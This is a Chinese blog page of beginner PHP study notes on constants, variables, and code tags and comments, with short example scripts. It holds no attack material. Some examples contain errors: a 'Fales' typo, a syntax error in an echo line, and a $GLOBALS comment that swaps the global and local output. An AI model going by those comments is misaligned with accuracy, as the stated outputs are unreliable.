<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;page&#x2F;4&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/4/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/13/PHP%E7%AC%94%E8%AE%B0-4%EF%BC%9A%E5%B8%B8%E9%87%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/13/PHP%E7%AC%94%E8%AE%B0-4%EF%BC%9A%E5%B8%B8%E9%87%8F/" itemprop="url">PHP笔记-4：常量</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-13T11:50:40+08:00">
                2020-03-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP/" itemprop="url" rel="index">
                    <span itemprop="name">PHP</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  769 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-常量"><a href="#1-常量" class="headerlink" title="1. 常量"></a>1. 常量</h4><ul>
<li>常量与变量一样，都是用来保存数据的。<ul>
<li>常量：const/constant，是一种在程序运行当中，不可改变的量（数据）</li>
<li>常量一旦定义，通常数据不可改变（用户级别）</li>
</ul>
</li>
<li>常量定义方式<ul>
<li>使用定义常量的函数：define(‘常量名’,常量值);<ul>
<li>首个参数定义常量的名称</li>
<li>第二个参数定义常量的值</li>
<li>可选的第三个参数规定常量名是否对大小写不敏感。默认是false</li>
</ul>
</li>
<li>const 常量名 = 值;（PHP5.3版本之后才有）</li>
<li>▲ define和const定义的常量是有区别：在于访问权限区别</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  //PHP常量</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  //使用函数定义常量：define</span><br><span class="line">  define(&apos;PI&apos;,3.14);</span><br><span class="line">  echo PI;</span><br><span class="line">  echo &apos;&lt;/br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">  $a = 1;</span><br><span class="line">  define(&apos;A&apos;,$a);</span><br><span class="line">  echo A;</span><br><span class="line">  echo &apos;&lt;/br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">  /*  // False -&gt; 区分大小写/True -&gt; 区分大小写</span><br><span class="line">    define(&apos;NAME&apos;,&apos;11&apos;);  // echo NAME -&gt; 输出 11</span><br><span class="line">    define(&apos;NAME&apos;,&apos;11&apos;,Fales);  // echo name -&gt; 输出错误</span><br><span class="line">    define(&apos;NAME&apos;,&apos;11&apos;,True);  // echo name -&gt; 输出 11</span><br><span class="line">  */</span><br><span class="line"></span><br><span class="line">  //使用const关键字定义</span><br><span class="line">  const PII = 3;</span><br><span class="line">  echo PII;</span><br><span class="line">  echo &apos;&lt;/br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">  //定义特殊常量</span><br><span class="line">  define(&apos;-_-&apos;,&apos;smile&apos;);</span><br><span class="line">  //const -_- = &apos;smile&apos;;  //错误  </span><br><span class="line"></span><br><span class="line">  //echo -_-;       //特殊符号不能直接使用</span><br><span class="line">  echo constant(&apos;-_-&apos;);</span><br><span class="line">  echo &apos;&lt;/br&gt;&apos;;   </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>常量名字的命名规则<ul>
<li>常量不需要使用“$”符号，一旦使用系统就会认为是变量</li>
<li>常量的名字组成由字母、数字和下划线组成，不能以数字开头</li>
<li>常量的名字通常是以大写字母为主（与变量以示区别）</li>
<li>常量命名的规则比变量要松散，可以使用一些特殊字符，该方式只能使用define定义</li>
</ul>
</li>
<li>常量的使用形式<ul>
<li>常量的使用与变量一样：不可改变值（在定义的时候必须赋值）</li>
<li>有的时候还需要使用另外一种形式来访问（针对的是特殊名字的常量），需要用到另外一个访问常量的函数：constant(‘常量名’)</li>
</ul>
</li>
</ul>
<ol start="2">
<li><p>系统常量</p>
<ul>
<li>系统帮助用户定义的常量，用户可以直接使用</li>
<li>常用的系统常量<ul>
<li>PHP_VERSION：PHP版本号</li>
<li>PHP_INT_SIZE：整形大小</li>
<li>PHP_INT_MAX：整形能表示的最大值（PHP中整形是允许出现负数：带符号）</li>
</ul>
</li>
<li>魔术常量<ul>
<li>魔术常量的值通常会跟着环境变化，但是用户改变不了</li>
<li><strong>DIR</strong>：当前被执行的脚本所在电脑的绝对路径</li>
<li><strong>FILE</strong>：当前被执行的脚本所在的电脑的绝对路径（带自己文件的名字）</li>
<li><strong>LINE</strong>：当前所属的行数</li>
<li><strong>NAMESPACE</strong>：当前所属的命名空间</li>
<li><strong>CLASS</strong>：当前所属的类</li>
<li><strong>METHOD</strong>：当前所属的方法</li>
</ul>
</li>
</ul>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    //系统常量</span><br><span class="line">    echo &apos;&lt;hr/&gt;&apos;,PHP_VERSION,&apos;&lt;br/&gt;&apos;,PHP_INT_SIZE,&apos;&lt;br/&gt;&apos;,PHP_INT_MAX;</span><br><span class="line"></span><br><span class="line">    //魔术常量</span><br><span class="line">    echo &apos;&lt;hr/&gt;&apos;;</span><br><span class="line">    echo __DIR__,&apos;&lt;br/&gt;&apos;,__FILE__,&apos;&lt;br/&gt;&apos;,__LINE__,&apos;&lt;br/&gt;&apos;;</span><br><span class="line">    echo __LINE__;</span><br><span class="line"></span><br><span class="line">    echo &apos;&lt;hr/&gt;&apos;;</span><br><span class="line">    echo __NAMESPACE__;  //后续会讲到</span><br><span class="line">    echo __CLASS__;  //后续会讲到</span><br><span class="line"></span><br><span class="line">    function demo()</span><br><span class="line">    &#123;</span><br><span class="line">        echo __METHOD__;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    demo();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/13/PHP%E7%AC%94%E8%AE%B0-3%EF%BC%9A%E5%8F%98%E9%87%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/13/PHP%E7%AC%94%E8%AE%B0-3%EF%BC%9A%E5%8F%98%E9%87%8F/" itemprop="url">PHP笔记-3：变量</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-13T11:42:29+08:00">
                2020-03-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP/" itemprop="url" rel="index">
                    <span itemprop="name">PHP</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  956 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-变量"><a href="#1-变量" class="headerlink" title="1. 变量"></a>1. 变量</h4><ul>
<li>▲ 变量是用来存储数据的；</li>
<li>变量的使用<ul>
<li>定义：在系统中增加对应的变量名字（内存）</li>
<li>赋值：可以将数据赋值给变量名（可以在定义的同时完成）</li>
<li>可以通过变量名访问存储的数据</li>
<li>可以将变量从内存中删除 -&gt; unset()</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  //变量</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  //定义变量：在PHP中不需要任何关键字定义变量（赋值）</span><br><span class="line">  $var1;    //定义变量</span><br><span class="line">  $var2 = 1;  //定义同时赋值</span><br><span class="line"></span><br><span class="line">  //访问变量</span><br><span class="line">  echo $var2; //通过var2变量名字找到存储的内容1，然后输出</span><br><span class="line">    echo &apos;&lt;/br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">  //修改变量</span><br><span class="line">  $var2 = 2;</span><br><span class="line">  echo &apos;&lt;/br&gt;&apos;;,$var2;</span><br><span class="line"></span><br><span class="line">  //删除变量：使用unset(变量名字)</span><br><span class="line">  unset($var2);</span><br><span class="line">    //echo $var2;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>变量命名规则<ul>
<li>变量名字必须以”$”符号开始</li>
<li>名字由字母、数字和下划线”_”构成，但是不能以数字开头</li>
<li>本身还允许中文变量（不建议）</li>
<li>变量名称对大小写敏感</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  //变量命名规则</span><br><span class="line">  $var_1;$var_var_1;$_var1; //正确格式</span><br><span class="line">      //$1var;  // 错误格式</span><br><span class="line"></span><br><span class="line">  $中国 = &apos;China&apos;;</span><br><span class="line">  echo $中国;</span><br><span class="line">    echo &apos;&lt;/br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">    //变量名称对大小写敏感</span><br><span class="line">    </span><br><span class="line">  $name = &apos;mzt&apos;;</span><br><span class="line">  define(&apos;NAME&apos;, $name);</span><br><span class="line"></span><br><span class="line">  echo NAME;</span><br><span class="line">    //echo name;  //会发生报错报错</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-预定义变量"><a href="#2-预定义变量" class="headerlink" title="2. 预定义变量"></a>2. 预定义变量</h4><ul>
<li>预定义变量：提前定义的变量，系统定义的变量，存储许多需要用到的数据（预定义变量都是数组）<ul>
<li>$_GET：获取所有表单以get方式提交的数据</li>
<li>$_POST：POST提交的数据都会保存在此</li>
<li>$_REQUEST：GET和POST提交的都会保存</li>
<li>$GLOBALS：PHP中所有的全局变量</li>
<li>$_SERVER：服务器信息</li>
<li>$_SESSION：session会话数据</li>
<li>$_COOKIE：cookie会话数据</li>
<li>$_ENV：环境信息</li>
<li>$_FILES：用户上传的文件信息</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line">    //GLOBALS预定义变量</span><br><span class="line">    </span><br><span class="line">    function test()&#123;</span><br><span class="line">      $a = &quot;b&quot;;</span><br><span class="line">      echo &apos;$a in global scope：&apos;.$GLOBALS[&quot;a&quot;].&quot;\n&quot;;</span><br><span class="line">      echo &apos;$a in current scope：&apos;.$a.&quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = &quot;c&quot;;</span><br><span class="line">    test(); //输出有两个，1为$a in global scope：b，2为$a in current scope：c</span><br><span class="line">    echo &apos;&lt;/br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">    //$_SERVER预定义变量</span><br><span class="line"></span><br><span class="line">    echo $_SERVER[&apos;SERVER_NAME&apos;];  //输出为 127.0.0.1</span><br><span class="line">    echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">  </span><br><span class="line">    //$_GET预定义变量，在后续内容有讲到</span><br><span class="line"></span><br><span class="line">    //$_POST预定义变量，在后续内容有讲到</span><br><span class="line">   </span><br><span class="line">    //$_SESSION预定义变量，在后续内容有讲到</span><br><span class="line"></span><br><span class="line">    //$_ENV预定义变量，在后续内容有讲到</span><br><span class="line"></span><br><span class="line">    //$_FILES预定义变量，在后续内容有讲到</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="3-可变变量"><a href="#3-可变变量" class="headerlink" title="3. 可变变量"></a>3. 可变变量</h4><ul>
<li>如果一个变量保存的值刚好是另外一个变量的名字，那么可以直接通过访问一个变量得到另外一个变量的值<ul>
<li>在变量前面再多加一个$符号</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  //可变变量</span><br><span class="line"></span><br><span class="line">  //定义两个变量</span><br><span class="line">  $a = &apos;b&apos;;</span><br><span class="line">  $b = &apos;bb&apos;;</span><br><span class="line"></span><br><span class="line">  echo $$a;  //输出为 bb</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>变量传值<ul>
<li>将一个变量赋值给另外一个变量：变量传值</li>
<li>变量传递两种方式<ul>
<li>值传递：将变量保存的值赋值一份，然后将新的值给另外一个变量保存（两个变量没有关系）</li>
<li>引用传递：将变量保存的值所在的内存地址，传递给另外一个变量：两个变量指向同一块内存空间（两个变量是同一个值）</li>
</ul>
</li>
</ul>
</li>
<li>内存分区<ul>
<li>栈区：程序可以操作的内存部分（不存数据，运行程序代码），少但是快</li>
<li>代码段：存储程序的内存部分（不执行）</li>
<li>数据段：存储普通数据（全局区和静态区）</li>
<li>堆区：存储复杂数据，大但是效率低</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">  //PHP变量传值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  //值传递</span><br><span class="line">  $a = 10;</span><br><span class="line">  $b = $a;</span><br><span class="line">  $b = 5;</span><br><span class="line">  echo $a,$b,&apos;&lt;br/&gt;&apos;;  //输出为 10,5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  //引用传递</span><br><span class="line">  $c = 10;</span><br><span class="line">  $d = &amp;$c;</span><br><span class="line">  $c = 5;</span><br><span class="line">  echo $c,$d,&apos;&lt;br/&gt;&apos;;  //输出为 5,5</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>变量传值分析图（图片来自网络）</li>
</ul>
<p><img src="/images/php/php-notepad/%E5%80%BC%E4%BC%A0%E9%80%92.png" alt="值传递"></p>
<p><img src="/images/php/php-notepad/%E5%BC%95%E7%94%A8%E4%BC%A0%E9%80%92.png" alt="引用传递"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/13/PHP%E7%AC%94%E8%AE%B0-2%EF%BC%9A%E6%B3%A8%E9%87%8A%E4%B8%8E%E6%A0%87%E8%AE%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/13/PHP%E7%AC%94%E8%AE%B0-2%EF%BC%9A%E6%B3%A8%E9%87%8A%E4%B8%8E%E6%A0%87%E8%AE%B0/" itemprop="url">PHP笔记-2：注释与标记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-13T11:28:43+08:00">
                2020-03-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PHP/" itemprop="url" rel="index">
                    <span itemprop="name">PHP</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  437 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-PHP代码标记"><a href="#1-PHP代码标记" class="headerlink" title="1. PHP代码标记"></a>1. PHP代码标记</h4><ul>
<li>ASP标记：<code>&lt;% php代码 %&gt;</code></li>
<li>短标记：<code>&lt;? php代码 ?&gt;</code></li>
<li>▲ 2020.03.06 在PHP7.3.4的版本中以上两种基本弃用，要使用短标记还能在配置文件php.ini中修改，但ASP标记已无</li>
</ul>
<p><img src="/images/php/php-notepad/PHP--%E7%9F%AD%E6%A0%87%E8%AE%B0.png" alt="PHP--短标记"></p>
<ul>
<li>脚本标记：<code>&lt;script language=&quot;php&quot;&gt;php代码&lt;/script&gt;</code></li>
<li>▲ 2020.03.06 在PHP7.3.4的版本中此代码无输出</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;b&gt;</span><br><span class="line">    &lt;script language=&quot;php&quot;&gt;</span><br><span class="line">      //脚本标记</span><br><span class="line">      echo &apos;hello world&apos;;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/b&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>标准标记（常用）：<code>&lt;?php php代码?&gt;</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;b&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">      //脚本标记</span><br><span class="line">      echo &apos;hello world&apos;;</span><br><span class="line">    ?&gt;</span><br><span class="line">  &lt;/b&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-PHP注释"><a href="#2-PHP注释" class="headerlink" title="2. PHP注释"></a>2. PHP注释</h4><ul>
<li>PHP中注释分为两种：行注释和块注释</li>
<li>行注释：一次注释一行<ul>
<li>//：后面跟的所有内容都是注释</li>
<li><code>#</code>：与//一样</li>
</ul>
</li>
<li>块注释：一次注释多行<br>/*：中间直到 */出现之前，全部都是注释 */</li>
<li>▲ 习惯：所有的代码在写的过程中都必须进行注释</li>
</ul>
